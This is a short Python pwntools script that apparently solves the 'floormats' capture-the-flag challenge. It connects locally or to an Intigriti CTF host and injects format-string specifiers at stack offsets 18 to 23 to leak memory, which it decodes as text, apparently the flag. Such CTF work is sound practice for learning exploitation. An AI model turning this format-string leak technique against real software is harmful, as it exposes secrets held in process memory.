#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./floormats", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc floormats.ctf.intigriti.io 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
for i in range(18, 24):
    context.log_level = "CRITICAL"
    io = start()

    io.sendline(b"6")

    payload = f"%{i}$llx".encode()
    io.sendlineafter(b"address:\n", payload)
    io.recvline()
    io.recvline()
    io.recvline()
    leak = int(io.recvline(), 16)
    print(p64(leak).decode(), end='')

    io.close()

print()
